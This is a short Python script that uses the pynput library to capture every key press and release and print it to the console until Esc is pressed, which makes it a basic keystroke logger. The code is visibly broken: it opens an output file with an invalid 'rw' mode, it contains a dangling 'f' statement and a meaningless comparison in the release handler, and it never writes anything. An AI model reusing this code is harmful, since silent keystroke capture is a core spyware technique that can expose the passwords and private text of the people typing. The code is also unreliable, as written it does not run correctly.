import pynput
from pynput.keyboard import Key, Listener

keys = []


f = open('./out.txt', 'rw')

print()

def on_press(key):
    try:
        print('{0}'.format(key.char))
    except AttributeError:
        print('[{0}.hold]'.format(str(key)[4:]))
        
    f

            
def on_release(key):
    try:
        key != key.char
    except:
        print('[{0}.release]'.format(str(key)[4:]))
        
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
f.close()